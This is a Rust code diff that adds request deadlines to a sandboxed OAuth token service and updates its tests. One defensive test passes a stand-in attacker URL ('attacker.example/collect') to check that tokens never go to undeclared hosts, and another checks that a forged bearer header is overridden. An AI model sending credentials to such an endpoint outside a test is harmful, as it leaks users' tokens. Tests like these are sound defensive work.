@@ -20,7 +20,7 @@ use lib_sandbox::oauth::{OAuthIntegration, StoredOAuthToken, token_setting_key};
 use serde_json::{Map, Value, json};
 use std::collections::{HashMap, HashSet};
 use std::sync::Arc;
-use std::time::{SystemTime, UNIX_EPOCH};
+use std::time::{Instant, SystemTime, UNIX_EPOCH};
 
 /// A token this close to its expiry is refreshed before use.
 const EXPIRY_MARGIN_MS: i64 = 60_000;
@@ -50,6 +50,14 @@ pub struct OAuthService {
     write_sealed: Arc<SealedWrite>,
     http: Arc<dyn HttpClient>,
     now_ms: Arc<dyn Fn() -> i64 + Send + Sync>,
+}
+
+/// One request module code asked `ctx.oauth` to make.
+struct ApiCall<'a> {
+    url: &'a str,
+    method: &'a str,
+    opts: &'a Value,
+    deadline: Instant,
 }
 
 impl OAuthService {
@@ -120,7 +128,7 @@ impl OAuthService {
         if let Some(secret) = client_secret(&integration, &settings) {
             form.push(("client_secret", secret));
         }
-        let token = self.token_request(module_id, &integration, &form, &client_id, None)?;
+        let token = self.token_request(module_id, &integration, &form, &client_id, None, None)?;
         let scope = token.scope.clone();
         self.save(module_id, integration_id, &token)?;
         Ok(scope)
@@ -134,7 +142,14 @@ impl OAuthService {
         url: &str,
         method: &str,
         opts: Value,
+        deadline: Instant,
     ) -> Result<Value, String> {
+        let call = ApiCall {
+            url,
+            method,
+            opts: &opts,
+            deadline,
+        };
         let integration = self.integration(module_id, integration_id)?;
         let mut token = self.load(module_id, integration_id)?.ok_or_else(|| {
             format!("{integration_id} is not connected; connect it from the module's settings")
@@ -148,16 +163,16 @@ impl OAuthService {
             .expires_at_ms
             .is_some_and(|at| at - EXPIRY_MARGIN_MS <= (self.now_ms)())
         {
-            token = self.refresh(module_id, &integration, token)?;
+            token = self.refresh(module_id, &integration, token, deadline)?;
         }
-        let response = self.send_with_token(module_id, &integration, &token, url, method, &opts)?;
+        let response = self.send_with_token(module_id, &integration, &token, &call)?;
         let unauthorized = response.get("status").and_then(Value::as_i64) == Some(401);
         if !unauthorized || token.refresh_token.is_none() {
             return Ok(response);
         }
         // The provider revoked or expired the token early: refresh once.
-        let token = self.refresh(module_id, &integration, token)?;
-        self.send_with_token(module_id, &integration, &token, url, method, &opts)
+        let token = self.refresh(module_id, &integration, token, deadline)?;
+        self.send_with_token(module_id, &integration, &token, &call)
     }
 
     fn send_with_token(
@@ -165,11 +180,9 @@ impl OAuthService {
         module_id: &str,
         integration: &OAuthIntegration,
         token: &StoredOAuthToken,
-        url: &str,
-        method: &str,
-        opts: &Value,
+        call: &ApiCall<'_>,
     ) -> Result<Value, String> {
-        let mut opts = opts.as_object().cloned().unwrap_or_default();
+        let mut opts = call.opts.as_object().cloned().unwrap_or_default();
         let mut headers = opts
             .get("headers")
             .and_then(Value::as_object)
@@ -185,10 +198,11 @@ impl OAuthService {
         self.http.request(HttpRequest {
             module_id,
             grants: &grants,
-            url,
-            method,
+            url: call.url,
+            method: call.method,
             opts: Value::Object(opts),
             enforcement: Enforcement::Always,
+            deadline: Some(call.deadline),
         })
     }
 
@@ -197,6 +211,7 @@ impl OAuthService {
         module_id: &str,
         integration: &OAuthIntegration,
         token: StoredOAuthToken,
+        deadline: Instant,
     ) -> Result<StoredOAuthToken, String> {
         let refresh_token = token.refresh_token.clone().ok_or_else(|| {
             format!(
@@ -219,6 +234,7 @@ impl OAuthService {
             &form,
             &token.client_id,
             Some(refresh_token),
+            Some(deadline),
         )?;
         self.save(module_id, &integration.id, &refreshed)?;
         Ok(refreshed)
@@ -233,6 +249,7 @@ impl OAuthService {
         form: &[(&str, String)],
         client_id: &str,
         previous_refresh_token: Option<String>,
+        deadline: Option<Instant>,
     ) -> Result<StoredOAuthToken, String> {
         let token_host = url::Url::parse(&integration.token_url)
             .ok()
@@ -250,6 +267,7 @@ impl OAuthService {
                 "body": body,
             }),
             enforcement: Enforcement::Always,
+            deadline,
         })?;
         let status = response.get("status").and_then(Value::as_i64).unwrap_or(0);
         let answer = response.get("body").cloned().unwrap_or(Value::Null);
@@ -381,6 +399,7 @@ impl OAuthExtension {
                     &url,
                     &method,
                     Value::Object(opts),
+                    Instant::now() + scope.remaining(),
                 )
                 .map_err(HostError::new)
         });
@@ -444,6 +463,7 @@ mod tests {
     use super::*;
     use lib_sandbox::{ModuleMetadata, ModuleState, RegisteredModule};
     use std::sync::Mutex;
+    use std::time::Duration;
 
     const NOW: i64 = 1_000_000_000_000;
 
@@ -679,6 +699,7 @@ mod tests {
                     "https://api.spotify.com/v1/me/player",
                     "GET",
                     json!({}),
+                    Instant::now() + Duration::from_secs(30),
                 )
                 .unwrap_err();
             assert!(err.contains("connect it again"), "{err}");
@@ -698,6 +719,7 @@ mod tests {
                 "https://api.spotify.com/v1/me/player",
                 "GET",
                 json!({ "headers": { "authorization": "Bearer forged" } }),
+                Instant::now() + Duration::from_secs(30),
             )
             .unwrap();
         assert_eq!(response["status"], 200);
@@ -729,6 +751,7 @@ mod tests {
                 "https://api.spotify.com/v1/me",
                 "GET",
                 Value::Null,
+                Instant::now() + Duration::from_secs(30),
             )
             .unwrap();
         assert_eq!(response["status"], 200);
@@ -763,7 +786,8 @@ mod tests {
                 "spotify",
                 "https://api.spotify.com/",
                 "GET",
-                Value::Null
+                Value::Null,
+                Instant::now() + Duration::from_secs(30),
             )
             .unwrap_err()
             .contains("not connected")
@@ -774,7 +798,8 @@ mod tests {
                 "github",
                 "https://api.github.com/",
                 "GET",
-                Value::Null
+                Value::Null,
+                Instant::now() + Duration::from_secs(30),
             )
             .unwrap_err()
             .contains("declares no OAuth integration")
@@ -783,14 +808,19 @@ mod tests {
 
     #[tokio::test(flavor = "multi_thread")]
     async fn a_token_never_goes_to_an_undeclared_host_even_when_the_policy_only_logs() {
-        use crate::services::http_client::{HttpPolicy, HttpPolicyMode, ReqwestHttpClient};
+        use crate::services::http_client::{
+            HttpClientLimits, HttpPolicy, HttpPolicyMode, ReqwestHttpClient,
+        };
 
         let token = json!({ "accessToken": "a1", "refreshToken": "r1", "expiresAtMs": NOW + 3_600_000, "scope": [], "clientId": "app", "tokenUrl": "https://accounts.spotify.com/api/token", "hosts": ["api.spotify.com"] });
         let settings = settings(&[("oauth.spotify", &token.to_string())]);
-        let http = Arc::new(ReqwestHttpClient::new(HttpPolicy {
-            mode: HttpPolicyMode::Log,
-            allow_private: false,
-        }));
+        let http = Arc::new(ReqwestHttpClient::new(
+            HttpPolicy {
+                mode: HttpPolicyMode::Log,
+                allow_private: false,
+            },
+            HttpClientLimits::default(),
+        ));
         let svc = service(settings, http);
         let error = tokio::task::block_in_place(|| {
             svc.request(
@@ -799,6 +829,7 @@ mod tests {
                 "https://attacker.example/collect",
                 "GET",
                 Value::Null,
+                Instant::now() + Duration::from_secs(30),
             )
         })
         .unwrap_err();
